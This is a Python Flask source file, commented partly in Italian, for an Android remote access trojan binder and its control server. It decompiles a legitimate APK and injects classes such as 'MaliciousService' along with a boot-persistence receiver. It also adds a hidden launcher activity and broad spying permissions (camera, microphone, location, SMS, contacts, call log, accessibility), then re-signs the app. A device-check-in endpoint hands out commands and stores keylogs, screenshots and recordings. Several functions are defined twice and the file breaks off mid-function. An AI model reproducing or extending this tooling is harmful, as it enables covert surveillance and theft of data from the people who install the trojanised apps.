from flask import Flask, request, render_template, jsonify, redirect, url_for, session, send_from_directory
from werkzeug.utils import secure_filename
import os, subprocess, tempfile, shutil, threading, time, datetime, re
from functools import wraps
import xml.etree.ElementTree as ET
import shlex
from androguard.core.apk import APK
import io
import uuid
import socket
import json
import requests

app = Flask(__name__)
app.secret_key = "modificami_con_qualcosa_di_lungo_e_segreto"
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024
app.config['BASE_UPLOAD_FOLDER'] = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'uploads')
app.config['BASE_SCREENSHOT_FOLDER'] = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static/screenshots')
app.config['BASE_FILE_FOLDER'] = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static/files')
app.config['BASE_CAMERA_FOLDER'] = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static/camera')

# Abilita CORS per consentire connessioni da qualsiasi origine
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

# Ensure all folders exist
os.makedirs(app.config['BASE_UPLOAD_FOLDER'], exist_ok=True)
os.makedirs(app.config['BASE_SCREENSHOT_FOLDER'], exist_ok=True)
os.makedirs(app.config['BASE_FILE_FOLDER'], exist_ok=True)
os.makedirs(app.config['BASE_CAMERA_FOLDER'], exist_ok=True)
os.makedirs(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static'), exist_ok=True)

# Template filter for timestamp formatting
@app.template_filter('timestamp_to_time')
def timestamp_to_time(timestamp):
    if not timestamp:
        return "N/A"
    return datetime.datetime.fromtimestamp(int(timestamp)).strftime('%Y-%m-%d %H:%M:%S')

# Helper functions
def get_user_folder(base_folder, username):
    """Get a user-specific folder and ensure it exists"""
    folder = os.path.join(base_folder, username)
    os.makedirs(folder, exist_ok=True)
    return folder

def run_cmd(username, cmd):
    """Run a command and return its output"""
    log_cmd(username, cmd)
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        log_cmd(username, f"Command failed with code {result.returncode}: {result.stderr}")
        raise Exception(f"Command failed: {result.stderr}")
    return result.stdout

def log_cmd(username, message):
    """Log a command to the user's log"""
    if username not in flask_user_logs:
        flask_user_logs[username] = []
    flask_user_logs[username].append({
        "timestamp": int(time.time()),
        "message": message
    })

def get_local_ip():
    """Get the local IP address in a more reliable way"""
    try:
        # This is more reliable than socket.gethostbyname(socket.gethostname())
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Doesn't need to be reachable, just used to determine interface
        s.connect(('8.8.8.8', 1))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        # Fallback methods
        try:
            # Try to get all network interfaces
            import netifaces
            gateways = netifaces.gateways()
            if 'default' in gateways and netifaces.AF_INET in gateways['default']:
                gateway_iface = gateways['default'][netifaces.AF_INET][1]
                addresses = netifaces.ifaddresses(gateway_iface)
                if netifaces.AF_INET in addresses and addresses[netifaces.AF_INET][0]['addr'] != '127.0.0.1':
                    return addresses[netifaces.AF_INET][0]['addr']
        except:
            pass
            
        # Last resort
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            if local_ip != '127.0.0.1':
                return local_ip
        except:
            pass
            
        return '127.0.0.1'  # Default fallback

def ensure_keystore(username):
    """Ensure a debug keystore exists for signing APKs"""
    keystore_path = os.path.join(get_user_folder(app.config['BASE_UPLOAD_FOLDER'], username), "debug.keystore")
    if not os.path.exists(keystore_path):
        # Create a debug keystore
        cmd = f"keytool -genkey -v -keystore {keystore_path} -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -dname \"CN=Android Debug,O=Android,C=US\""
        subprocess.run(cmd, shell=True, check=True)
    return keystore_path

def inject_rat_code(username, decoded_dir, server_ip, flask_port, rat_port):
    """Inject RAT code into the decoded APK"""
    manifest_path = os.path.join(decoded_dir, "AndroidManifest.xml")
    
    # Check if the manifest file exists
    if not os.path.exists(manifest_path):
        log_cmd(username, f"AndroidManifest.xml not found at {manifest_path}")
        raise Exception("AndroidManifest.xml not found")
    
    # Read the manifest file
    with open(manifest_path, 'r', encoding='utf-8') as f:
        manifest_content = f.read()
    
    # Add permissions if they don't exist
    permissions = [
        "android.permission.INTERNET",
        "android.permission.ACCESS_NETWORK_STATE",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.RECEIVE_BOOT_COMPLETED",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.CAMERA",
        "android.permission.RECORD_AUDIO",
        "android.permission.READ_CONTACTS",
        "android.permission.READ_SMS",
        "android.permission.READ_CALL_LOG",
        "android.permission.FOREGROUND_SERVICE"
    ]
    
    for permission in permissions:
        if f'android:name="{permission}"' not in manifest_content:
            # Add the permission before the </manifest> tag
            manifest_content = manifest_content.replace('</manifest>', f'    <uses-permission android:name="{permission}" />\n</manifest>')
    
    # Add the receiver and service if they don't exist
    if 'android:name="com.example.android.BootReceiver"' not in manifest_content:
        # Add the receiver before the </application> tag
        receiver_xml = '''    <receiver android:name="com.example.android.BootReceiver" android:enabled="true" android:exported="true">
        <intent-filter>
            <action android:name="android.intent.action.BOOT_COMPLETED" />
            <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
        </intent-filter>
    </receiver>
'''
        manifest_content = manifest_content.replace('</application>', f'{receiver_xml}</application>')
    
    if 'android:name="com.example.android.MaliciousService"' not in manifest_content:
        # Add the service before the </application> tag
        service_xml = '''    <service android:name="com.example.android.MaliciousService" android:enabled="true" android:exported="true" />
'''
        manifest_content = manifest_content.replace('</application>', f'{service_xml}</application>')
    
    # Add the activity if it doesn't exist
    if 'android:name="com.example.android.PermissionRequestActivity"' not in manifest_content:
        # Add the activity before the </application> tag
        activity_xml = '''    <activity android:name="com.example.android.PermissionRequestActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar" />
'''
        manifest_content = manifest_content.replace('</application>', f'{activity_xml}</application>')
    
    # Write the modified manifest back to the file
    with open(manifest_path, 'w', encoding='utf-8') as f:
        f.write(manifest_content)
    
    log_cmd(username, "AndroidManifest.xml modified successfully")
app.config['BASE_MIC_FOLDER'] = 'static/mic'
os.makedirs(app.config['BASE_UPLOAD_FOLDER'], exist_ok=True)
os.makedirs(app.config['BASE_SCREENSHOT_FOLDER'], exist_ok=True)
os.makedirs(app.config['BASE_FILE_FOLDER'], exist_ok=True)
os.makedirs(app.config['BASE_CAMERA_FOLDER'], exist_ok=True)
os.makedirs(app.config['BASE_MIC_FOLDER'], exist_ok=True)
data_lock = threading.Lock()
devices_data = {}
flask_user_logs = {}
user_configs = {}
# Get your actual IP address - you need to replace this with your actual local IP
# You can find it by running: ipconfig (Windows) or ifconfig (Linux/Mac)
# Flask web interface configuration - ONLY this should be changed in code
FLASK_WEB_PORT = "12000"  # Port for Flask web interface - change this if needed

# RAT Configuration - These will be set dynamically by users during binding
DEFAULT_RAT_IP = "127.0.0.1"    # Default IP for RAT connections
DEFAULT_RAT_PORT = "12000"      # Default port for RAT connections

# Global variables for dynamic configuration
CURRENT_FLASK_PORT = FLASK_WEB_PORT

# Active connections for RAT devices
active_rat_connections = {}  # device_id -> socket connection

# Socket connection endpoint for RAT devices
@app.route("/api/rat_connect", methods=["POST", "OPTIONS"])
def rat_connect():
    """Handle RAT device socket-style connections via HTTP"""
    # Gestisci le richieste OPTIONS per CORS
    if request.method == "OPTIONS":
        return jsonify({"status": "ok"}), 200
        
    # Gestisci le richieste POST normali
    try:
        data = request.json
        if not data:
            # Se non ci sono dati JSON, prova a leggere i dati form
            data = request.form.to_dict()
            
        device_id = data.get('device_id')
        device_type = data.get('device_type', 'unknown')
        connection_type = data.get('connection_type', 'register')

        print(f"[RAT] Connection from {request.remote_addr} - Device: {device_id}, Type: {connection_type}")
        append_flask_log("SERVER_EVENTS", f"Tentativo di connessione da {request.remote_addr} - Device: {device_id}, Type: {connection_type}")

        if not device_id:
            return jsonify({"error": "Missing device_id"}), 400
    except Exception as e:
        print(f"[ERROR] Exception in rat_connect: {str(e)}")
        append_flask_log("SERVER_EVENTS", f"Errore nella connessione: {str(e)}")
        return jsonify({"error": str(e), "status": "error"}), 500
    
    with data_lock:
        if device_id not in devices_data:
            print(f"[RAT] NEW DEVICE: {device_id} (Type: {device_type})")
            devices_data[device_id] = {
                'location': {}, 'logs': [], 'screenshots': [], 'commands': [], 
                'files': [], 'camera': [], 'mic': [], 'keylog': [], 
                'device_type': device_type, 'last_seen': int(time.time()),
                'connection_ip': request.remote_addr
            }
            append_flask_log("RAT_EVENTS", f"New RAT device connected: {device_id} from {request.remote_addr}")
        else:
            devices_data[device_id]['last_seen'] = int(time.time())
            devices_data[device_id]['connection_ip'] = request.remote_addr
    
    # Return any pending commands
    commands = devices_data.get(device_id, {}).get('commands', [])
    devices_data[device_id]['commands'] = []  # Clear after sending
    
    response = {
        "status": "connected",
        "device_id": device_id,
        "commands": commands,
        "server_time": int(time.time())
    }
    
    return jsonify(response)

# No separate RAT handler needed - everything is integrated in Flask

def get_user_folder(base_folder, username):
    user_specific_folder = os.path.join(base_folder, username)
    os.makedirs(user_specific_folder, exist_ok=True)
    return user_specific_folder

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'username' not in session:
            return redirect(url_for('login'))
        username = session['username']
        get_user_folder(app.config['BASE_UPLOAD_FOLDER'], username)
        get_user_folder(app.config['BASE_SCREENSHOT_FOLDER'], username)
        get_user_folder(app.config['BASE_FILE_FOLDER'], username)
        get_user_folder(app.config['BASE_CAMERA_FOLDER'], username)
        get_user_folder(app.config['BASE_MIC_FOLDER'], username)
        return f(*args, **kwargs)
    return decorated

def append_flask_log(username, text):
    with data_lock:
        if username not in flask_user_logs:
            flask_user_logs[username] = []
        flask_user_logs[username].append(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {text}")
        if len(flask_user_logs[username]) > 100:
            flask_user_logs[username] = flask_user_logs[username][-100:]

def append_device_log(device_id, text):
    with data_lock:
        if device_id not in devices_data:
            print(f"WARNING: Attempt to log for unregistered device_id: {device_id} - {text}")
            return
        logs = devices_data[device_id]['logs']
        logs.append(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {text}")
        if len(logs) > 100:
            devices_data[device_id]['logs'] = logs[-100:]

def run_cmd(username, cmd, cwd=None):
    append_flask_log(username, f"$ {cmd}")
    apktool_jar_path = r"C:\Tools\apktool.jar" # Ensure this path is correct for your system
    actual_cmd_list = []
    if cmd.startswith("apktool d"):
        cmd_parts = cmd.split(" ", 2)
        if len(cmd_parts) < 3: raise ValueError(f"Malformed apktool d command: {cmd}")
        actual_cmd_list = ["java", "-jar", apktool_jar_path, cmd_parts[1]] + shlex.split(cmd_parts[2])
    elif cmd.startswith("apktool b"):
        cmd_parts = cmd.split(" ", 2)
        if len(cmd_parts) < 3: raise ValueError(f"Malformed apktool b command: {cmd}")
        actual_cmd_list = ["java", "-jar", apktool_jar_path, cmd_parts[1]] + shlex.split(cmd_parts[2])
    else:
        actual_cmd_list = shlex.split(cmd)
    try:
        proc = subprocess.Popen(actual_cmd_list, cwd=cwd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)
        stdout_data, stderr_data = proc.communicate(timeout=300)
        for line in stdout_data.splitlines():
            append_flask_log(username, line.rstrip())
        if stderr_data:
            append_flask_log(username, f"CMD_ERROR_OUTPUT: {stderr_data.rstrip()}")
        if proc.returncode != 0:
            raise RuntimeError(f"Command failed with exit code {proc.returncode}: {cmd}\nOutput:\n{stdout_data}\nError Output:\n{stderr_data}")
        return stdout_data
    except subprocess.TimeoutExpired:
        proc.kill()
        stdout_data, stderr_data = proc.communicate()
        raise RuntimeError(f"Timeout occurred for command: {cmd}\nOutput:\n{stdout_data}\nError Output:\n{stderr_data}")
    except Exception as e:
        raise RuntimeError(f"Error executing command '{cmd}': {str(e)}")

def get_package_name(decoded_path):
    apk_path = os.path.join(decoded_path, "..", "input.apk")
    if not os.path.exists(apk_path):
        raise RuntimeError(f"Original APK not found for androguard: {apk_path}")
    try:
        apk = APK(apk_path)
        package = apk.get_package()
        append_flask_log(session['username'], f"Package name extracted with Androguard: {package}")
        return package
    except Exception as e:
        raise RuntimeError(f"Error parsing with Androguard: {str(e)}")

def ensure_keystore(username):
    keystore_path = os.path.expanduser(r"~\.android\debug.keystore")
    if not os.path.exists(keystore_path):
        append_flask_log(username, "debug.keystore not found. Creating it...")
        generate_keystore(username, keystore_path)
        return keystore_path
    try:
        result = subprocess.run(["keytool", "-list", "-v", "-keystore", keystore_path, "-storepass", "android"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        output = result.stdout
        match = re.search(r"until: (.+)", output)
        if match:
            expire_str = match.group(1).strip()
            expire_str = expire_str.replace("GMT", "").strip()
            try:
                expire_date = datetime.datetime.strptime(expire_str, "%a %b %d %H:%M:%S %Y")
            except ValueError:
                append_flask_log(username, f"Warning: Date format '{expire_str}' not recognized. Regenerating keystore for safety.")
                os.remove(keystore_path)
                generate_keystore(username, keystore_path)
                return keystore_path
            if expire_date < datetime.datetime.now():
                append_flask_log(username, "debug.keystore expired. Regenerating it...")
                os.remove(keystore_path)
                generate_keystore(username, keystore_path)
            else:
                append_flask_log(username, f"debug.keystore valid until {expire_date.strftime('%Y-%m-%d %H:%M:%S')}.")
        else:
            append_flask_log(username, "Expiry date not found in debug.keystore. Regenerating for safety...")
            os.remove(keystore_path)
            generate_keystore(username, keystore_path)
    except subprocess.CalledProcessError as e:
        append_flask_log(username, f"Error running keytool: {e.output}")
        if os.path.exists(keystore_path):
            os.remove(keystore_path)
        generate_keystore(username, keystore_path)
    except Exception as e:
        append_flask_log(username, f"Generic error checking keystore: {str(e)}")
        if os.path.exists(keystore_path):
            os.remove(keystore_path)
        generate_keystore(username, keystore_path)
    return keystore_path

def generate_keystore(username, path):
    try:
        subprocess.run(["keytool", "-genkey", "-v", "-keystore", path, "-storepass", "android", "-alias", "androiddebugkey", "-keypass", "android", "-keyalg", "RSA", "-validity", "10000", "-dname", "CN=Android Debug,O=Android,C=US"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        append_flask_log(username, "debug.keystore generated successfully.")
    except subprocess.CalledProcessError as e:
        error_output = e.stderr.decode().strip() if e.stderr else ""
        append_flask_log(username, f"Error generating keystore: {error_output}")
        raise RuntimeError("Could not create debug.keystore: " + error_output)
    except Exception as e:
        append_flask_log(username, f"Unexpected error generating keystore: {str(e)}")
        raise RuntimeError(f"Could not create debug.keystore: {str(e)}")

def inject_rat_code(username, decoded_path, server_ip, server_port, flask_port):
    smali_base_dir = os.path.join(decoded_path, "smali")
    manifest_path = os.path.join(decoded_path, "AndroidManifest.xml")
    assets_dir_path = os.path.join(decoded_path, "assets")
    os.makedirs(assets_dir_path, exist_ok=True)
    if not os.path.exists(smali_base_dir):
        raise RuntimeError(f"Smali base directory not found in: {smali_base_dir}")
    append_flask_log(username, f"Smali base directory found: {smali_base_dir}")
    your_generated_smali_root = r"smali_templates" # Ensure this path is correct relative to app.py
    rat_smali_source_root = os.path.join(your_generated_smali_root, "com", "example", "android")
    if not os.path.exists(rat_smali_source_root):
        raise RuntimeError(f"YOUR generated SMALI folder not found in {rat_smali_source_root}. Make sure the path is correct.")
    try:
        target_smali_dir_for_rat = os.path.join(smali_base_dir, "com", "example", "android")
        os.makedirs(target_smali_dir_for_rat, exist_ok=True)
        for item_name in os.listdir(rat_smali_source_root):
            s_item = os.path.join(rat_smali_source_root, item_name)
            d_item = os.path.join(target_smali_dir_for_rat, item_name)
            if os.path.isdir(s_item):
                shutil.copytree(s_item, d_item, dirs_exist_ok=True)
            else:
                shutil.copy2(s_item, d_item)
        append_flask_log(username, f"Copied your generated Smali classes from {rat_smali_source_root} to {target_smali_dir_for_rat}")
    except Exception as e:
        raise RuntimeError(f"Error copying your generated Smali: {str(e)}")
    
    # Get local IP address
    local_ip = socket.gethostbyname(socket.gethostname())
    if local_ip == "127.0.0.1":
        # Try to get a better local IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            local_ip = "192.168.1.100"  # Fallback to a common local IP
    
    # Generate config.ini with both local and public IPs and PORT
    config_content = f"[SERVER]\nLOCAL_IP={local_ip}\nPUBLIC_IP={server_ip}\nPORT={flask_port}\n"
    config_file_path = os.path.join(assets_dir_path, "config.ini")
    with open(config_file_path, "w") as f:
        f.write(config_content)
    append_flask_log(username, f"Injected config file with Local IP {local_ip}, Public IP {server_ip}, Flask port {flask_port} for API calls and RAT port {server_port} for socket connections: {config_file_path}")
    
    ANDROID_NS = "{http://schemas.android.com/apk/res/android}"
    tree = ET.parse(manifest_path)
    root = tree.getroot()
    append_flask_log(username, "AndroidManifest.xml loaded for modification.")
    
    permissions_to_add = [
        "android.permission.INTERNET",  # Fondamentale per la connessione al server
        "android.permission.ACCESS_NETWORK_STATE",  # Necessario per verificare la connettività
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.RECEIVE_BOOT_COMPLETED",
        "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.FOREGROUND_SERVICE",
        "android.permission.RECORD_AUDIO",
        "android.permission.CAMERA",
        "android.permission.SYSTEM_ALERT_WINDOW",
        "android.permission.BIND_ACCESSIBILITY_SERVICE",
        "android.permission.PACKAGE_USAGE_STATS",
        "android.permission.READ_PHONE_STATE"  # Aggiunto per ottenere informazioni sul dispositivo
    ]
    
    existing_permissions = set()
    for child in root.findall('uses-permission'):
        existing_permissions.add(child.get(f'{ANDROID_NS}name'))
    
    for perm in permissions_to_add:
        if perm not in existing_permissions:
            ET.SubElement(root, 'uses-permission', {f'{ANDROID_NS}name': perm})
            append_flask_log(username, f"Added permission: {perm}")
        else:
            append_flask_log(username, f"Permission '{perm}' already exists.")
            
    application_tag = root.find('application')
    if application_tag is None:
        raise RuntimeError("Application tag not found in AndroidManifest.xml")
    append_flask_log(username, "Application tag found. Adding Receiver and Service.")
    
    # --- BootReceiver modification ---
    receiver_tag_name = f"com.example.android.BootReceiver"
    existing_receiver = application_tag.find(f"receiver[@{ANDROID_NS}name='{receiver_tag_name}']")
    
    if existing_receiver is None:
        receiver = ET.SubElement(application_tag, 'receiver', {
            f'{ANDROID_NS}name': receiver_tag_name,
            f'{ANDROID_NS}enabled': 'true',
            f'{ANDROID_NS}exported': 'true'
        })
        intent_filter = ET.SubElement(receiver, 'intent-filter')
        ET.SubElement(intent_filter, 'action', {f'{ANDROID_NS}name': 'android.intent.action.BOOT_COMPLETED'})
        ET.SubElement(intent_filter, 'action', {f'{ANDROID_NS}name': 'android.intent.action.MY_PACKAGE_REPLACED'})
        # Add PACKAGE_ADDED for first install persistence
        ET.SubElement(intent_filter, 'action', {f'{ANDROID_NS}name': 'android.intent.action.PACKAGE_ADDED'})
        ET.SubElement(intent_filter, 'data', {f'{ANDROID_NS}scheme': 'package'})
        append_flask_log(username, f"Added BootReceiver: {receiver_tag_name}")
    else:
        append_flask_log(username, f"BootReceiver '{receiver_tag_name}' already exists. Ensuring actions are present.")
        # Ensure BOOT_COMPLETED, MY_PACKAGE_REPLACED, and PACKAGE_ADDED are present
        found_boot_completed = False
        found_package_replaced = False
        found_package_added = False
        found_data_scheme = False

        # Iterate existing intent-filters to check for required actions
        for intent_filter_tag in existing_receiver.findall('intent-filter'):
            for action_tag in intent_filter_tag.findall('action'):
                if action_tag.get(f'{ANDROID_NS}name') == 'android.intent.action.BOOT_COMPLETED':
                    found_boot_completed = True
                if action_tag.get(f'{ANDROID_NS}name') == 'android.intent.action.MY_PACKAGE_REPLACED':
                    found_package_replaced = True
                if action_tag.get(f'{ANDROID_NS}name') == 'android.intent.action.PACKAGE_ADDED':
                    found_package_added = True
            # Check for data scheme only if PACKAGE_ADDED is expected to use it
            if found_package_added and intent_filter_tag.find('data') is not None and intent_filter_tag.find('data').get(f'{ANDROID_NS}scheme') == 'package':
                found_data_scheme = True
        
        # If any required action is missing, add a new intent-filter for it
        if not (found_boot_completed and found_package_replaced and found_package_added):
            new_intent_filter = ET.SubElement(existing_receiver, 'intent-filter')
            if not found_boot_completed:
                ET.SubElement(new_intent_filter, 'action', {f'{ANDROID_NS}name': 'android.intent.action.BOOT_COMPLETED'})
                append_flask_log(username, f"Added missing BOOT_COMPLETED action to BootReceiver.")
            if not found_package_replaced:
                ET.SubElement(new_intent_filter, 'action', {f'{ANDROID_NS}name': 'android.intent.action.MY_PACKAGE_REPLACED'})
                append_flask_log(username, f"Added missing MY_PACKAGE_REPLACED action to BootReceiver.")
            if not found_package_added:
                ET.SubElement(new_intent_filter, 'action', {f'{ANDROID_NS}name': 'android.intent.action.PACKAGE_ADDED'})
                append_flask_log(username, f"Added missing PACKAGE_ADDED action to BootReceiver.")
            # Ensure data scheme is added if PACKAGE_ADDED was just added or found to be missing its scheme
            if (not found_package_added) or (found_package_added and not found_data_scheme):
                 if new_intent_filter.find('data') is None: # Only add if not already added to this new filter
                     ET.SubElement(new_intent_filter, 'data', {f'{ANDROID_NS}scheme': 'package'})
                     append_flask_log(username, f"Added missing data scheme to new BootReceiver intent-filter for PACKAGE_ADDED.")
        
        # If PACKAGE_ADDED was already there but missed data scheme, try to add it to an existing filter
        elif found_package_added and not found_data_scheme:
            for intent_filter_tag in existing_receiver.findall('intent-filter'):
                if intent_filter_tag.find(f'action[@{ANDROID_NS}name="android.intent.action.PACKAGE_ADDED"]') is not None:
                    if intent_filter_tag.find('data') is None:
                        ET.SubElement(intent_filter_tag, 'data', {f'{ANDROID_NS}scheme': 'package'})
                        append_flask_log(username, f"Added missing data scheme to existing BootReceiver intent-filter with PACKAGE_ADDED.")
                    break


    # --- MaliciousService modification ---
    service_tag_name = f"com.example.android.MaliciousService"
    if application_tag.find(f"service[@{ANDROID_NS}name='{service_tag_name}']") is None:
        service_attrs = {
            f'{ANDROID_NS}name': service_tag_name,
            f'{ANDROID_NS}enabled': 'true',
            f'{ANDROID_NS}exported': 'false'
        }
        ET.SubElement(application_tag, 'service', service_attrs)
        append_flask_log(username, f"Added MaliciousService: {service_tag_name}")
    else:
        append_flask_log(username, f"MaliciousService '{service_tag_name}' already exists.")
    
    # --- PermissionRequestActivity modification ---
    permission_activity_name = f"com.example.android.PermissionRequestActivity"
    if application_tag.find(f"activity[@{ANDROID_NS}name='{permission_activity_name}']") is None:
        activity_attrs = {
            f'{ANDROID_NS}name': permission_activity_name,
            f'{ANDROID_NS}theme': "@android:style/Theme.Translucent.NoTitleBar",
            f'{ANDROID_NS}excludeFromRecents': "true",
            f'{ANDROID_NS}noHistory': "true"
        }
        ET.SubElement(application_tag, 'activity', activity_attrs)
        append_flask_log(username, f"Added PermissionRequestActivity: {permission_activity_name}")
    else:
        append_flask_log(username, f"PermissionRequestActivity '{permission_activity_name}' already exists.")

    # --- LauncherActivity modification (CRITICAL FOR ICON HIDING/LAUNCH) ---
    launcher_activity_name = f"com.example.android.LauncherActivity"
    our_launcher_tag = application_tag.find(f"activity[@{ANDROID_NS}name='{launcher_activity_name}']")
    
    # Create or ensure our LauncherActivity exists
    if our_launcher_tag is None:
        our_launcher_tag = ET.SubElement(application_tag, 'activity', {
            f'{ANDROID_NS}name': launcher_activity_name,
            f'{ANDROID_NS}theme': "@android:style/Theme.Translucent.NoTitleBar",
            f'{ANDROID_NS}excludeFromRecents': "true",
            f'{ANDROID_NS}noHistory': "true"
        })
        append_flask_log(username, f"Added LauncherActivity: {launcher_activity_name}")
    else:
        append_flask_log(username, f"LauncherActivity '{launcher_activity_name}' already exists.")

    # NON rimuoviamo più i MAIN/LAUNCHER intent-filters dalle attività originali
    # per permettere all'app di funzionare normalmente
    append_flask_log(username, "Preserving original app's MAIN/LAUNCHER intent-filters for normal functionality")
    
    # Vecchio codice commentato:
    # elements_to_process = list(application_tag.findall('activity')) + list(application_tag.findall('activity-alias'))
    # for element_tag in elements_to_process:
    #     element_name = element_tag.get(f'{ANDROID_NS}name')
    #     if element_name == launcher_activity_name or element_name == f'.{launcher_activity_name.split(".")[-1]}':
    #         continue
    #     for intent_filter_tag in list(element_tag.findall('intent-filter')):
    #         is_main_action = False
    #         is_launcher_category = False
    #         for child in intent_filter_tag:
    #             if child.tag == 'action' and child.get(f'{ANDROID_NS}name') == 'android.intent.action.MAIN':
    #                 is_main_action = True
    #             if child.tag == 'category' and child.get(f'{ANDROID_NS}name') == 'android.intent.category.LAUNCHER':
    #                 is_launcher_category = True
    #         if is_main_action and is_launcher_category:
    #             element_tag.remove(intent_filter_tag)
    #             append_flask_log(username, f"Removed MAIN/LAUNCHER intent-filter from: {element_name}")
    
    # Aggiungiamo un intent-filter per il nostro LauncherActivity, ma senza LAUNCHER
    # per evitare di mostrare due icone dell'app
    found_our_launcher_filter = False
    for intent_filter_tag in our_launcher_tag.findall('intent-filter'):
        is_main_action = False
        for action_tag in intent_filter_tag.findall('action'):
            if action_tag.get(f'{ANDROID_NS}name') == 'android.intent.action.MAIN':
                is_main_action = True
                found_our_launcher_filter = True
                break
        if found_our_launcher_filter:
            break
    
    if not found_our_launcher_filter:
        launcher_intent_filter = ET.SubElement(our_launcher_tag, 'intent-filter')
        ET.SubElement(launcher_intent_filter, 'action', {f'{ANDROID_NS}name': 'android.intent.action.MAIN'})
        # Non aggiungiamo la categoria LAUNCHER per evitare di mostrare due icone
        append_flask_log(username, f"Added MAIN intent-filter (without LAUNCHER) to {launcher_activity_name} to avoid duplicate icons.")
    
    try:
        tree.write(manifest_path, encoding="utf-8", xml_declaration=True)
        append_flask_log(username, "AndroidManifest.xml modified successfully.")
    except Exception as e:
        raise RuntimeError(f"Error writing AndroidManifest.xml: {str(e)}")

@app.route('/login', methods=['GET','POST'])
def login():
    error = None
    if request.method == 'POST':
        u = request.form.get('username')
        if u and len(u.strip()) > 1:
            session['username'] = u.strip()
            return redirect(url_for('index'))
        else:
            error = "Invalid username. Must be at least 2 characters."
    return render_template('login.html', error=error)

@app.route("/old", methods=["GET", "POST"])
@login_required
def index():
    username = session['username']
    current_config = user_configs.get(username, {})
    ip_val = current_config.get('server_ip', '')
    port_val = current_config.get('server_port', '')
    flask_port_val = current_config.get('flask_port', '')
    if request.method == "POST":
        apk = request.files.get('apkfile')
        ip = request.form.get('ip')
        port = request.form.get('port')
        flask_port = request.form.get('flask_port')
        if not apk or not apk.filename or not apk.filename.lower().endswith(".apk"):
            return jsonify({"error":"Missing or invalid APK file."}), 400
        if not ip or not port:
            return jsonify({"error":"Server IP and RAT port are required."}), 400
        if not flask_port:
            return jsonify({"error":"Flask web port is required."}), 400
        user_configs[username] = {'server_ip': ip, 'server_port': port, 'flask_port': flask_port}
        
        append_flask_log(username, f"🔄 Using configuration: IP={ip}, RAT Port={port}, Flask Port={flask_port}")
        
        user_upload_folder = get_user_folder(app.config['BASE_UPLOAD_FOLDER'], username)
        workdir = tempfile.mkdtemp(prefix=f"rat_binder_{username}_")
        append_flask_log(username, f"Working directory created: {workdir}")
        try:
            apk_path = os.path.join(workdir, "input.apk")
            apk.save(apk_path)
            append_flask_log(username, f"APK uploaded to: {apk_path}")
            decoded_path = os.path.join(workdir, "decoded")
            append_flask_log(username, f"Decompiling APK to: {decoded_path}...")
            run_cmd(username, f"apktool d -f \"{apk_path}\" -o \"{decoded_path}\"")
            append_flask_log(username, "Apktool decompilation finished. Verifying 'decoded' folder...")
            if not os.path.exists(decoded_path) or not os.path.isdir(decoded_path):
                raise RuntimeError(f"Error: 'decoded' folder not found or is not a directory after Apktool: {decoded_path}")
            manifest_test_path = os.path.join(decoded_path, "AndroidManifest.xml")
            if not os.path.exists(manifest_test_path):
                raise RuntimeError(f"Error: AndroidManifest.xml not found in: {manifest_test_path}")
            smali_test_path = os.path.join(decoded_path, "smali")
            if not os.path.exists(smali_test_path) or not os.path.isdir(smali_test_path):
                raise RuntimeError(f"Error: 'smali' folder not found or is not a directory in 'decoded': {smali_test_path}")
            append_flask_log(username, "Verified 'decoded' folder, AndroidManifest.xml, and 'smali' folder correctly.")
            append_flask_log(username, "APK decompiled successfully.")
            
            # This is where the magic happens: inject RAT code and modify manifest
            inject_rat_code(username, decoded_path, ip, port, flask_port)
            append_flask_log(username, "RAT injection complete.")
            
            unsigned_apk_path = os.path.join(workdir, "modified.apk")
            append_flask_log(username, f"Recompiling APK to: {unsigned_apk_path}...")
            run_cmd(username, f"apktool b \"{decoded_path}\" -o \"{unsigned_apk_path}\" --use-aapt2")
            append_flask_log(username, "APK recompiled successfully.")
            
            append_flask_log(username, "Checking or generating debug.keystore...")
            keystore = ensure_keystore(username)
            signed_apk_path = unsigned_apk_path # jarsigner signs in place
            append_flask_log(username, f"Signing APK with keystore: {keystore}...")
            run_cmd(username, f'jarsigner -verbose -keystore "{keystore}" -storepass android -keypass android "{signed_apk_path}" androiddebugkey')
            append_flask_log(username, "APK signed successfully.")
            
            aligned_apk_path = os.path.join(workdir, "final_aligned.apk")
            append_flask_log(username, "Running zipalign on signed APK...")
            zipalign_cmd = f"zipalign -v 4 \"{signed_apk_path}\" \"{aligned_apk_path}\""
            run_cmd(username, zipalign_cmd, cwd=workdir)
            append_flask_log(username, "APK zipaligned successfully.")
            
            if os.path.exists(signed_apk_path):
                os.remove(signed_apk_path)
                append_flask_log(username, f"Removed unaligned APK: {signed_apk_path}")
